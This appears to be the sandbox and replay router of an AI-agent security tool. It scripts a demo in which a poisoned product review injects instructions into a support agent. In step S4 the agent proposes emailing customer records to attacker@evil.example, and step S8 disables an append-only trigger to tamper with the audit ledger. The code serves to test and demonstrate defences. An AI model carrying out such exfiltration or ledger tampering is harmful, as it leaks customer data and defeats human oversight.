"""
Agent Sandbox and Replay Engine router (SS-01..SS-04, DEMO-01, DEMO-02, api.md §2.2).

Provides:
- POST /api/v1/sandbox/message: screens message and runs agent turn
- POST /api/v1/sandbox/load-review: loads a review (e.g. rv-p2) through read_reviews tool
- POST /api/v1/sandbox/replay: initializes scripted replay (demo-v1)
- POST /api/v1/sandbox/replay/step: executes a single replay step (S1..S8)
- GET  /api/v1/sandbox/outbox: lists simulated outbox emails and database ops
- POST /api/v1/sandbox/reset: administrative sandbox reset (demo mode only)
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

from fastapi import APIRouter, Header
from pydantic import BaseModel

from backend.app.actiongate.approvals import decide_approval
from backend.app.actiongate.gateway import execute_action, propose_action
from backend.app.breachpath.changes import apply_graph_changes
from backend.app.breachpath.remediation import preview_remediation
from backend.app.breachpath.search import find_routes
from backend.app.breachpath.store import get_current_graph, save_graph_version
from backend.app.config import settings
from backend.app.core import errors
from backend.app.core import session as session_core
from backend.app.core.auth import authenticate_human
from backend.app.core.clock import get_clock
from backend.app.core.ids import next_id, reset_counters
from backend.app.core.llm import get_adapter
from backend.app.db import get_connection
from backend.app.promptshield.shield import screen_text

router = APIRouter(prefix="/sandbox", tags=["sandbox"])

REVIEWS_PATH = Path(__file__).resolve().parents[4] / "seed" / "reviews.json"
REPLAY_PATH = Path(__file__).resolve().parents[4] / "seed" / "replay_demo_v1.json"

_replay_state: dict[str, Any] = {
    "active": False,
    "current_step_idx": 0,
    "completed_steps": set(),
}


class MessageRequest(BaseModel):
    session_id: str
    text: str


class LoadReviewRequest(BaseModel):
    session_id: str
    review_id: str


class ReplayInitRequest(BaseModel):
    script_id: str
    reset: bool = True


class ReplayStepRequest(BaseModel):
    session_id: str
    step_id: str


@router.post("/message")
def post_sandbox_message(
    req: MessageRequest,
    authorization: str | None = Header(None),
) -> dict[str, Any]:
    """Run an agent interaction turn through PromptShield and ActionGate."""
    authenticate_human(authorization)
    conn = get_connection()

    s_row = conn.execute(
        "SELECT session_id, agent_id, taint_level FROM sessions WHERE session_id = ?",
        (req.session_id,),
    ).fetchone()
    if not s_row:
        raise errors.SentinelError(
            code="session.not_found",
            status_code=404,
            message=f"Session {req.session_id} not found.",
        )

    # 1. Screen user ingress
    screen_res = screen_text(
        tier="user",
        text=req.text,
        session_id=req.session_id,
        source_ref="sandbox:message",
    )

    steps: list[dict[str, Any]] = [
        {
            "kind": "ingress",
            "request_id": screen_res.request_id,
            "outcome": screen_res.outcome,
            "text": screen_res.text_for_model or screen_res.reason,
        }
    ]

    if screen_res.outcome in ("block", "escalate"):
        steps.append({
            "kind": "reply",
            "request_id": next_id("req_"),
            "outcome": screen_res.outcome,
            "text": f"Blocked by Sentinel: {screen_res.reason}",
        })
        return {"steps": steps}

    # 2. Simulated agent reaction: if message implies reading records
    text_lower = req.text.lower()
    if "order" in text_lower or "customer" in text_lower or "list" in text_lower:
        act_res = propose_action(
            agent_id=s_row["agent_id"],
            session_id=req.session_id,
            action_type="db.read",
            arguments={"resource": "asset:customer_db", "limit": 10},
        )
        steps.append({
            "kind": "action",
            "request_id": act_res.get("request_id", next_id("req_")),
            "outcome": act_res["outcome"],
            "text": f"Proposed db.read on asset:customer_db: {act_res['outcome']} ({act_res.get('reason', '')})",
        })
        steps.append({
            "kind": "reply",
            "request_id": next_id("req_"),
            "outcome": "allow" if act_res["outcome"] == "allow" else act_res["outcome"],
            "text": "Fetched 10 customer records." if act_res["outcome"] == "allow" else "Action requires human approval.",
        })
    else:
        steps.append({
            "kind": "reply",
            "request_id": next_id("req_"),
            "outcome": "allow",
            "text": f"Processed: {screen_res.text_for_model}",
        })

    return {"steps": steps}


@router.post("/load-review")
def post_sandbox_load_review(
    req: LoadReviewRequest,
    authorization: str | None = Header(None),
) -> dict[str, Any]:
    """Execute tool:read_reviews with a specific review ID and return screened result."""
    authenticate_human(authorization)
    conn = get_connection()

    s_row = conn.execute(
        "SELECT session_id FROM sessions WHERE session_id = ?",
        (req.session_id,),
    ).fetchone()
    if not s_row:
        raise errors.SentinelError(
            code="session.not_found",
            status_code=404,
            message=f"Session {req.session_id} not found.",
        )

    if not REVIEWS_PATH.exists():
        raise errors.SentinelError(
            code="review.not_found",
            status_code=404,
            message="Reviews dataset not found.",
        )

    with open(REVIEWS_PATH, encoding="utf-8") as f:
        reviews = json.load(f)

    target_rev = next((r for r in reviews if r.get("id") == req.review_id), None)
    if not target_rev:
        raise errors.SentinelError(
            code="review.not_found",
            status_code=404,
            message=f"Review '{req.review_id}' not found.",
        )

    screen_res = screen_text(
        tier="tool_output",
        text=target_rev["text"],
        session_id=req.session_id,
        source_ref=f"tool:read_reviews#{req.review_id}",
    )

    sess = session_core.get_session(req.session_id)
    t_lvl = sess.taint_level if sess else 0
    t_lbl = {0: "clean", 1: "untrusted_present", 2: "flagged"}.get(t_lvl, "clean")

    return {
        "request_id": screen_res.request_id,
        "outcome": screen_res.outcome,
        "reason": screen_res.reason,
        "rule_ids": screen_res.rule_ids,
        "decision_path": screen_res.decision_path,
        "policy_version": screen_res.policy_version,
        "text_for_model": screen_res.text_for_model,
        "findings": screen_res.findings,
        "session": {"taint_level": t_lvl, "taint_label": t_lbl},
        "review_id": screen_res.review_id,
    }


@router.post("/replay")
def post_sandbox_replay(
    req: ReplayInitRequest,
    authorization: str | None = Header(None),
) -> dict[str, Any]:
    """Start scripted replay (DEMO-01, demo-script.md §3)."""
    authenticate_human(authorization)

    if req.script_id != "demo-v1":
        raise errors.SentinelError(
            code="replay.unknown_script",
            status_code=404,
            message=f"Unknown replay script '{req.script_id}'.",
        )

    if not REPLAY_PATH.exists():
        raise errors.SentinelError(
            code="replay.not_found",
            status_code=404,
            message="Replay script file not found.",
        )

    with open(REPLAY_PATH, encoding="utf-8") as f:
        script = json.load(f)

    session_id = "sess_demo0001"
    conn = get_connection()

    if req.reset:
        reset_counters()
        now_iso = get_clock().now_iso()
        conn.execute(
            """INSERT OR REPLACE INTO sessions
               (session_id, agent_id, owner_user_id, taint_level, taint_reasons_json, created_at)
               VALUES (?, 'supportbot', 'alice', 0, '[]', ?)""",
            (session_id, now_iso),
        )
        conn.execute("DELETE FROM outbox")
        conn.execute("DELETE FROM fakedb_ops")
        conn.execute("DELETE FROM exec_tokens_used")
        conn.execute("DELETE FROM approvals WHERE action_id IN (SELECT action_id FROM actions WHERE session_id = ?)", (session_id,))
        conn.execute("DELETE FROM actions WHERE session_id = ?", (session_id,))
        conn.commit()

        _replay_state["active"] = True
        _replay_state["current_step_idx"] = 0
        _replay_state["completed_steps"] = set()

    steps = [
        {"id": step["id"], "title": step["title"], "status": "pending"}
        for step in script.get("steps", [])
    ]

    return {
        "session_id": session_id,
        "steps": steps,
    }


@router.post("/replay/step")
def post_sandbox_replay_step(
    req: ReplayStepRequest,
    authorization: str | None = Header(None),
) -> dict[str, Any]:
    """Execute a single scripted replay step and verify expected matches."""
    authenticate_human(authorization)

    if not REPLAY_PATH.exists():
        raise errors.SentinelError(
            code="replay.not_found",
            status_code=404,
            message="Replay script file not found.",
        )

    with open(REPLAY_PATH, encoding="utf-8") as f:
        script = json.load(f)

    step_obj = next((s for s in script.get("steps", []) if s["id"] == req.step_id), None)
    if not step_obj:
        raise errors.SentinelError(
            code="replay.unknown_step",
            status_code=404,
            message=f"Step '{req.step_id}' not found in replay script.",
        )

    step_id = req.step_id
    expected = step_obj.get("expected", {})
    actual: dict[str, Any] = {}
    request_ids: list[str] = []

    conn = get_connection()

    if step_id == "S1":
        # Attack graph check
        g_ver, g_model = get_current_graph(conn)
        routes_res = find_routes(g_model, max_depth=4)
        actual["routes_count"] = len(routes_res.routes)
        derived_nodes = [n["id"] for n in g_model.get("nodes", []) if n.get("entry_source") == "derived"]
        actual["derived_badges"] = sorted(derived_nodes)
        actual["highlight_route"] = "p_460263f0bbf3"

    elif step_id == "S2":
        # Session check
        now_iso = get_clock().now_iso()
        conn.execute(
            """INSERT OR REPLACE INTO sessions
               (session_id, agent_id, owner_user_id, taint_level, taint_reasons_json, created_at)
               VALUES (?, 'supportbot', 'alice', 0, '[]', ?)""",
            (req.session_id, now_iso),
        )
        conn.commit()
        actual["session_id"] = req.session_id
        actual["taint_level"] = 0
        actual["taint_label"] = "clean"
        outbox_count = conn.execute("SELECT COUNT(*) FROM outbox").fetchone()[0]
        actual["outbox_empty"] = outbox_count == 0

    elif step_id == "S3":
        # Load poisoned review rv-p2
        with open(REVIEWS_PATH, encoding="utf-8") as f:
            reviews = json.load(f)
        rev = next(r for r in reviews if r["id"] == "rv-p2")
        screen_res = screen_text(
            tier="tool_output",
            text=rev["text"],
            session_id=req.session_id,
            source_ref="tool:read_reviews#rv-p2",
        )
        sess = session_core.get_session(req.session_id)
        t_lvl = sess.taint_level if sess else 0
        t_lbl = {0: "clean", 1: "untrusted_present", 2: "flagged"}.get(t_lvl, "clean")

        request_ids.append(screen_res.request_id)
        actual["outcome"] = screen_res.outcome
        actual["rule_ids"] = screen_res.rule_ids
        actual["decision_path"] = screen_res.decision_path
        actual["findings"] = [{"type": f["type"], "confidence_pct": f["confidence_pct"]} for f in screen_res.findings]
        actual["text_for_model"] = screen_res.text_for_model
        actual["session_taint"] = t_lvl
        actual["taint_label"] = t_lbl

    elif step_id == "S4":
        # Agent proposes email
        args = {
            "to": ["attacker@evil.example"],
            "subject": "Customer export",
            "body": "Alice A,alice@x.example,120.50",
            "resource": "svc:mailer",
        }
        dec = propose_action(
            agent_id="supportbot",
            session_id=req.session_id,
            action_type="email.send",
            arguments=args,
        )
        request_ids.append(dec.get("request_id", ""))
        actual["outcome"] = dec["outcome"]
        actual["rule_ids"] = dec.get("rule_ids", [])
        actual["decision_path"] = dec.get("decision_path", "")
        actual["approval_status"] = "pending" if dec.get("approval_id") else "none"
        actual["approval_id"] = dec.get("approval_id")

    elif step_id == "S5":
        # Alice tries to approve her own request -> 403
        # First find pending approval
        appr_row = conn.execute(
            "SELECT approval_id, action_id, fingerprint FROM approvals WHERE kind = 'action' AND status = 'pending' ORDER BY created_at DESC LIMIT 1"
        ).fetchone()
        appr_id = appr_row[0] if appr_row else "apr_000001"
        act_id = appr_row[1] if appr_row else "act_000001"

        try:
            decide_approval(approval_id=appr_id, decision="approve", approver_id="alice", approver_roles=["requester"])
            actual["self_approval_code"] = "unexpected_allow"
        except errors.SentinelError as err:
            actual["self_approval_code"] = err.code

        # Bob rejects
        dec_bob = decide_approval(approval_id=appr_id, decision="reject", approver_id="bob", approver_roles=["approver"], comment="Recipient is not an Acme address.")
        actual["bob_approval_status"] = dec_bob["status"]

        # Follow-up execute attempt -> 409
        try:
            execute_action(
                agent_id="supportbot",
                action_id=act_id,
                submitted_action={
                    "action_type": "email.send",
                    "arguments": {
                        "to": ["attacker@evil.example"],
                        "subject": "Customer export",
                        "body": "Alice A,alice@x.example,120.50",
                        "resource": "svc:mailer",
                    },
                },
            )
            actual["execute_error_code"] = "unexpected_executed"
        except errors.SentinelError as err:
            actual["execute_error_code"] = err.code

    elif step_id == "S6":
        # Admin removes read access
        g_cur_ver, model = get_current_graph(conn)
        routes_before = find_routes(model).routes
        prev = preview_remediation(model, "e-agent-read-customerdb", routes_before, graph_version=g_cur_ver)
        actual["preview_removed"] = prev["removed"]
        actual["preview_remaining_count"] = len(prev["remaining"])
        actual["new_routes_count"] = len(prev["new"])

        new_model, errors_list = apply_graph_changes(model, [{"op": "remove_edge", "edge_id": "e-agent-read-customerdb"}])
        next_ver = save_graph_version(
            model=new_model,
            parent_version=g_cur_ver,
            change_summary=[{"op": "remove_edge", "edge_id": "e-agent-read-customerdb"}],
            created_by="admin",
            conn=conn,
        )
        actual["graph_version"] = next_ver

    elif step_id == "S7":
        # Toggle LLM mode to down
        adapter = get_adapter()
        adapter.set_mode("down")
        actual["llm_mode"] = adapter.get_mode()

        dec = propose_action(
            agent_id="supportbot",
            session_id=req.session_id,
            action_type="db.read",
            arguments={"resource": "asset:customer_db", "limit": 5},
        )
        actual["outcome"] = dec["outcome"]
        actual["decision_path"] = dec["decision_path"]
        actual["rule_ids"] = dec.get("rule_ids", [])

    elif step_id == "S8":
        from backend.app.core import ledger
        v1 = ledger.verify()
        actual["pre_verify_valid"] = v1["valid"]

        # Tamper row directly
        # Find step 4 decision row (action.decided with email.send)
        row = conn.execute("SELECT seq FROM ledger WHERE event_type = 'action.decided' ORDER BY seq DESC LIMIT 1").fetchone()
        tamper_seq = row[0] if row else 1
        conn.execute("DROP TRIGGER IF EXISTS ledger_no_update")
        conn.execute("UPDATE ledger SET outcome = 'allow' WHERE seq = ?", (tamper_seq,))
        conn.execute("""
            CREATE TRIGGER IF NOT EXISTS ledger_no_update
                BEFORE UPDATE ON ledger
            BEGIN
                SELECT RAISE(ABORT, 'ledger is append-only');
            END;
        """)
        conn.commit()

        v2 = ledger.verify()
        actual["post_verify_valid"] = v2["valid"]
        actual["post_verify_reason"] = v2["reason"]

    _replay_state["completed_steps"].add(step_id)

    # Compare actual against expected
    match = True
    for k, v in expected.items():
        if k in actual:
            if isinstance(v, list) and isinstance(actual[k], list):
                if sorted(str(x) for x in v) != sorted(str(x) for x in actual[k]):
                    match = False
            elif actual[k] != v:
                match = False

    return {
        "step_id": step_id,
        "actor": step_obj.get("actor", "alice"),
        "request_ids": request_ids,
        "expected": expected,
        "actual": actual,
        "match": match,
    }


@router.get("/outbox")
def get_sandbox_outbox(
    authorization: str | None = Header(None),
) -> dict[str, Any]:
    """Retrieve simulated outbox emails and fake DB operations."""
    authenticate_human(authorization)
    conn = get_connection()

    emails_rows = conn.execute(
        "SELECT outbox_id, ts, to_json, subject, body_excerpt, simulated FROM outbox ORDER BY outbox_id ASC"
    ).fetchall()

    emails = [
        {
            "outbox_id": r["outbox_id"],
            "ts": r["ts"],
            "to": json.loads(r["to_json"]) if r["to_json"] else [],
            "subject": r["subject"],
            "body_excerpt": r["body_excerpt"],
            "simulated": bool(r["simulated"]),
        }
        for r in emails_rows
    ]

    db_rows = conn.execute(
        "SELECT op_id, op, resource, record_count FROM fakedb_ops ORDER BY op_id ASC"
    ).fetchall()

    db_ops = [
        {
            "op_id": r["op_id"],
            "op": r["op"],
            "resource": r["resource"],
            "record_count": r["record_count"],
        }
        for r in db_rows
    ]

    return {
        "emails": emails,
        "db_ops": db_ops,
    }


@router.post("/reset")
def post_sandbox_reset(
    authorization: str | None = Header(None),
) -> dict[str, Any]:
    """Reset sandbox environment (admin only, demo mode only)."""
    if not settings.demo_mode:
        raise errors.SentinelError(
            code="demo.disabled",
            status_code=404,
            message="Sandbox reset is disabled when DEMO_MODE is off.",
        )

    user = authenticate_human(authorization)
    if "admin" not in user.get("roles", []):
        raise errors.SentinelError(
            code="auth.forbidden_role",
            status_code=403,
            message="Admin role required to reset sandbox.",
        )

    conn = get_connection()
    conn.execute("DELETE FROM outbox")
    conn.execute("DELETE FROM fakedb_ops")
    conn.execute("DELETE FROM exec_tokens_used")
    conn.execute("DELETE FROM approvals")
    conn.execute("DELETE FROM ingress_reviews")
    conn.execute("DELETE FROM actions")

    now_iso = get_clock().now_iso()
    conn.execute(
        """INSERT OR REPLACE INTO sessions
           (session_id, agent_id, owner_user_id, taint_level, taint_reasons_json, created_at)
           VALUES ('sess_demo0001', 'supportbot', 'alice', 0, '[]', ?)""",
        (now_iso,),
    )
    conn.commit()

    _replay_state["active"] = False
    _replay_state["current_step_idx"] = 0
    _replay_state["completed_steps"].clear()

    return {
        "status": "reset",
        "cleared": ["sessions", "outbox", "approvals", "fakedb_ops", "ingress_reviews"],
    }
